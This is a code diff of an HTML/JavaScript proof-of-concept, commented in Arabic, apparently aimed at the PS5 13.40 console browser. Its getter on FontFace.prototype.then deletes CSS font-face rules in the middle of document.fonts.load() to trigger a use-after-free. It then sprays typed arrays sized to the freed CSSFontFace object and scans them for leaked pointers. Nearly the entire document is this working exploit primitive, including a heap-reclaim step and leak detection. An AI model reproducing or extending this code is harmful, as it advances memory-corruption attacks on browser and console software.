@@ -2,13 +2,32 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS5 13.40 — CSSFontFace Reclaim Test</title>
+<title>PS5 13.40 — CSSFontFace Reclaim Test (Full Log)</title>
+<style>
+    body { background: #000; color: #0f0; font-family: monospace; padding: 10px; font-size: 13px; }
+    #log { white-space: pre-wrap; word-break: break-all; max-height: 90vh; overflow-y: auto; }
+    .red { color: #f44; }
+    .grn { color: #0f0; }
+    .ylw { color: #ff0; }
+    .cyn { color: #0ff; }
+    .mag { color: #f0f; }
+</style>
 </head>
 <body>
+<div id="log">[←] بدء الاختبار...<br></div>
+
 <script>
 "use strict";
 
-// ========== تكوين الـ font-face rules ==========
+const logDiv = document.getElementById('log');
+function L(tag, msg) {
+    const prefix = `<span class="${tag}">[${tag}]</span>`;
+    logDiv.innerHTML += `${prefix} ${msg}<br>`;
+    console.log(`[${tag}] ${msg}`);
+}
+
+// ========== تكوين font-face rules ==========
+L('←', 'إضافة @font-face rules (5 faces)...');
 const style = document.createElement('style');
 style.textContent = `
 @font-face { font-family: 'F1'; src: local('Arial'); unicode-range: U+41-42; }
@@ -18,81 +37,217 @@ style.textContent = `
 @font-face { font-family: 'F5'; src: local('Arial'); unicode-range: U+49-50; }
 `;
 document.head.appendChild(style);
+L('grn', '✓ تم إضافة ' + style.sheet.cssRules.length + ' rules');
 
-const log = [];
-let reclaimResults = [];
+let reclaimArrays = {
+    batch1: [], // قبل الـ flush
+    batch2: []  // بعد الـ flush
+};
 
-// ========== 3 أنواع reclaim ==========
-function tryReclaimMethods() {
-    const methods = [];
+// ========== 3 طرق reclaim ==========
+function doReclaim() {
+    const results = [];
     
-    // الطريقة 1: Uint8Array(0xC8) — تطابق حجم CSSFontFace القديم
-    for (let i = 0; i < 500; i++) {
-        methods.push(new Uint8Array(0xC8));
-    }
+    // Uint8Array(0xC8) — نفس حجم CSSFontFace على PS4
+    const u8 = new Uint8Array(0xC8);
+    for (let i = 0; i < u8.length; i++) u8[i] = 0x41;
+    results.push({ type: 'Uint8Array(0xC8)', arr: u8 });
     
-    // الطريقة 2: ArrayBuffer(0xC8) — مخازن خلفية مختلفة
-    for (let i = 0; i < 500; i++) {
-        methods.push(new ArrayBuffer(0xC8));
-    }
+    // Uint8Array(0x100) — حجم اكبر شوي
+    const u8b = new Uint8Array(0x100);
+    for (let i = 0; i < u8b.length; i++) u8b[i] = 0x42;
+    results.push({ type: 'Uint8Array(0x100)', arr: u8b });
     
-    // الطريقة 3: Float64Array(0x19) — 0xC8 / 8 = 0x19
-    for (let i = 0; i < 500; i++) {
-        methods.push(new Float64Array(0x19));
-    }
+    // Uint32Array(0x32) — 0x32 * 4 = 0xC8
+    const u32 = new Uint32Array(0x32);
+    for (let i = 0; i < u32.length; i++) u32[i] = 0x41414141;
+    results.push({ type: 'Uint32Array(0x32)', arr: u32 });
     
-    return methods;
+    // Float64Array(0x19) — 0x19 * 8 = 0xC8
+    const f64 = new Float64Array(0x19);
+    for (let i = 0; i < f64.length; i++) f64[i] = 0x41414141;
+    results.push({ type: 'Float64Array(0x19)', arr: f64 });
+    
+    // Float64Array(0x20) — 0x100 bytes
+    const f64b = new Float64Array(0x20);
+    for (let i = 0; i < f64b.length; i++) f64b[i] = 0x42424242;
+    results.push({ type: 'Float64Array(0x20)', arr: f64b });
+    
+    // ArrayBuffer(0xC8)
+    const ab = new ArrayBuffer(0xC8);
+    const abView = new Uint8Array(ab);
+    for (let i = 0; i < abView.length; i++) abView[i] = 0x43;
+    results.push({ type: 'ArrayBuffer(0xC8)', arr: ab });
+    
+    // ArrayBuffer(0x100)
+    const ab2 = new ArrayBuffer(0x100);
+    const abView2 = new Uint8Array(ab2);
+    for (let i = 0; i < abView2.length; i++) abView2[i] = 0x44;
+    results.push({ type: 'ArrayBuffer(0x100)', arr: ab2 });
+    
+    return results;
 }
 
-// ========== Getter setup ==========
+// ========== فحص الـ reclaim arrays ==========
+function scanResults(arrays, label) {
+    L('ylw', `── فحص ${label} ──`);
+    let totalFound = 0;
+    
+    for (const entry of arrays) {
+        const arr = entry.arr;
+        const type = entry.type;
+        let found = 0;
+        let ptrs = [];
+        
+        // Uint8Array
+        if (arr instanceof Uint8Array) {
+            for (let i = 0; i < Math.min(arr.length, 200); i++) {
+                if (arr[i] !== 0x41 && arr[i] !== 0x42 && arr[i] !== 0x43 && arr[i] !== 0x44) {
+                    found++;
+                    if (found <= 5) ptrs.push(`[${i}]=0x${arr[i].toString(16)}`);
+                }
+            }
+        }
+        // Uint32Array
+        else if (arr instanceof Uint32Array) {
+            for (let i = 0; i < Math.min(arr.length, 50); i++) {
+                const v = arr[i];
+                if (v !== 0x41414141) {
+                    found++;
+                    if (found <= 5) ptrs.push(`[${i}]=0x${v.toString(16)}`);
+                }
+            }
+        }
+        // Float64Array
+        else if (arr instanceof Float64Array) {
+            for (let i = 0; i < Math.min(arr.length, 25); i++) {
+                const v = arr[i];
+                if (v !== 0x41414141 && v !== 0x42424242) {
+                    found++;
+                    if (found <= 5) {
+                        const hex = v.toString(16);
+                        ptrs.push(`[${i}]=0x${hex}`);
+                    }
+                }
+            }
+        }
+        // ArrayBuffer
+        else if (arr instanceof ArrayBuffer) {
+            const view = new Uint8Array(arr);
+            for (let i = 0; i < Math.min(view.length, 200); i++) {
+                if (view[i] !== 0x43 && view[i] !== 0x44) {
+                    found++;
+                    if (found <= 5) ptrs.push(`[${i}]=0x${view[i].toString(16)}`);
+                }
+            }
+        }
+        
+        if (found > 0) {
+            L('mag', `  🔴 ${type}: ${found} تغيير — ${ptrs.join(', ')}`);
+            totalFound += found;
+        } else {
+            L('cyn', `  ✓ ${type}: كل القيم متطابقة`);
+        }
+    }
+    
+    return totalFound;
+}
+
+// ========== Getter ==========
+L('←', 'تثبيت FontFace.prototype.then getter...');
+
+let thenFired = false;
+let getterStart = 0;
+
 Object.defineProperty(FontFace.prototype, 'then', {
     get() {
-        log.push('then fired');
+        thenFired = true;
+        getterStart = performance.now();
+        L('grn', '🔥 then getter FIRED!');
         
         // CSSOM mutation
         if (style.sheet) {
+            const count = style.sheet.cssRules.length;
+            L('ylw', `  rules before delete: ${count}`);
             while (style.sheet.cssRules.length > 0) style.sheet.deleteRule(0);
+            L('ylw', `  rules after delete: ${style.sheet.cssRules.length}`);
         }
-        if (style.parentNode) style.parentNode.removeChild(style);
+        if (style.parentNode) {
+            style.parentNode.removeChild(style);
+            L('ylw', '  style element removed');
+        }
         
         // reclaim batch 1: قبل الـ flush
-        const r1 = tryReclaimMethods();
-        reclaimResults.push({ phase: 'beforeFlush', methods: r1 });
+        L('←', '  Reclaim batch 1 (قبل flush)...');
+        reclaimArrays.batch1 = doReclaim();
+        L('grn', `  ✓ ${reclaimArrays.batch1.length} arrays allocated`);
         
+        // Force style flush
+        L('←', '  تنفيذ style flush...');
         document.body.getBoundingClientRect();
+        L('grn', '  ✓ style flushed');
         
         // reclaim batch 2: بعد الـ flush
-        const r2 = tryReclaimMethods();
-        reclaimResults.push({ phase: 'afterFlush', methods: r2 });
+        L('←', '  Reclaim batch 2 (بعد flush)...');
+        reclaimArrays.batch2 = doReclaim();
+        L('grn', `  ✓ ${reclaimArrays.batch2.length} arrays allocated`);
         
         return undefined;
     }
 });
 
-// تشغيل
+// ========== تشغيل ==========
+L('←', '');
+L('←', '=== تشغيل document.fonts.load() ===');
+const startTime = performance.now();
+
 document.fonts.load('16px F1, F2, F3, F4, F5', 'ABCDE').then(faces => {
-    log.push('done: ' + faces.length + ' faces');
-    console.log(log.join('\n'));
+    const elapsed = (performance.now() - startTime).toFixed(2);
+    L('grn', `✓ promise resolved after ${elapsed}ms`);
+    L('grn', `✓ faces loaded: ${faces.length}`);
     
-    // افحص reclaim arrays
-    let found = 0;
-    for (const batch of reclaimResults) {
-        for (const m of batch.methods) {
-            // اقرأ أول 10 قيم
-            for (let i = 0; i < Math.min(10, m.length || m.byteLength); i++) {
-                const v = m[i];
-                if (v && v > 0x100000000000 && v < 0x10000000000000) {
-                    console.log('🔴 LEAKED [' + batch.phase + ']: 0x' + v.toString(16).toUpperCase());
-                    found++;
-                    break;
+    // افحصنتائج
+    L('←', '');
+    L('←', '=== تحليل النتائج ===');
+    
+    let totalLeaked = 0;
+    totalLeaked += scanResults(reclaimArrays.batch1, 'batch1 (قبل flush)');
+    totalLeaked += scanResults(reclaimArrays.batch2, 'batch2 (بعد flush)');
+    
+    L('←', '');
+    if (totalLeaked > 0) {
+        L('mag', `✅ تم العثور على ${totalLeaked} قيمة غير متوقعة!`);
+        L('mag', 'هذا يشير إلى أن الـ reclaim ضبط والـ UAF نشط');
+    } else {
+        L('red', '❌ لا توجد قيم غير متوقعة');
+        L('red', 'الـ reclaim ما ضبط — نحتاج أحجام أو أنواع allocators مختلفة');
+        
+        // جرب نقرأ أول 10 قيم من كل array
+        L('←', '');
+        L('ylw', '── تفاصيل أول 5 قيم من كل reclaim array ──');
+        for (const batch of ['batch1', 'batch2']) {
+            for (const entry of reclaimArrays[batch]) {
+                const arr = entry.arr;
+                const type = entry.type;
+                let vals = '';
+                const limit = Math.min(arr.length || (arr.byteLength || 0), 5);
+                for (let i = 0; i < limit; i++) {
+                    let v;
+                    if (arr instanceof Uint8Array) v = arr[i];
+                    else if (arr instanceof Uint32Array) v = arr[i];
+                    else if (arr instanceof Float64Array) v = arr[i];
+                    else if (arr instanceof ArrayBuffer) v = new Uint8Array(arr)[i];
+                    if (v !== undefined) vals += `[${i}]=0x${v.toString(16)} `;
                 }
+                L('cyn', `  ${type} (${batch}): ${vals}`);
             }
-            if (found > 50) break;
         }
-        if (found > 50) break;
     }
     
-    console.log('Total leaked: ' + found);
+    L('←', '');
+    L('grn', '✔ انتهى الاختبار');
+}).catch(e => {
+    L('red', '❌ promise rejected: ' + e.message);
 });
 </script>
 </body>
